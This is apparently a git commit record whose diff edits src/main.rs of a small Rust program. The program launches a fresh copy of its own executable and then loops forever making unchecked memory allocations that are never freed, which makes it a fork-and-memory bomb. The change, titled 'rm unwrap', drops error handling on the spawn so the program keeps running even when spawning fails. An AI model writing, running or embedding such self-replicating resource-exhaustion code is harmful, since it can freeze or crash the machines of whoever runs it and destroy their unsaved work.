fa5db198277fe977946ac0b12ca885bd80d422cf
jjonojj <jo.piechl@outlook.com>
2024-12-10 16:50:39 +0100

    rm unwrap

--- src/main.rs
+++ src/main.rs
@@ -2,7 +2,7 @@ use std::alloc::{alloc, Layout};
 use std::env;
 use std::process::Command;
 fn main() {
-    Command::new(env::current_exe().unwrap()).spawn().unwrap();
+    let _ = Command::new(env::current_exe().unwrap()).spawn();
     loop {
         unsafe {
             let _ = alloc(Layout::from_size_align_unchecked(0x4096, 0x2));
